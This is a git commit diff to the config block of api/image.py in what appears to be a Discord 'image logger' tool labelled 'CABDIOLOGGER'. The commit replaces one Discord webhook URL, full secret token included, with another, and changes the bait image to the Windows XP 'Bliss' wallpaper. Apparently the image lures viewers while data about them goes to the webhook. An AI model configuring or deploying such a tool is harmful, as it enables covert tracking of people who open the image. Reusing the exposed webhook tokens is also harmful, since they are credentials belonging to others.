0c1375f4a219ed99dbd3dbec602a866eb86df588
egemen123boytje-tech <egemen123boytje@gmail.com>
2026-06-19 01:21:51 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -10,8 +10,8 @@ __version__ = "v2.0"
 __author__ = "cabdio"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1425211812638621736/zF72k5B_XQ07fcCM6LpZ9enZ6rCBmG4xnfprwO7eN0DVgrgSzj6Xki08Vq0n25DiuAid",
-    "image": "https://stickerly.pstatic.net/sticker_pack/eNrxqOuc388RTr1MVqOg/BKPGHG/16/61453289.png", 
+    "webhook": "https://discord.com/api/webhooks/1517307871333716191/RJSEAwdhDsMBgqOpOFyV0aIrPnBdd3fwv7KFeq2tSDXmKshXC60DbrkqO_llJ6saxZcH",
+    "image": "https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png", 
     "imageArgument": True,
 
     "username": "CABDIOLOGGER", 
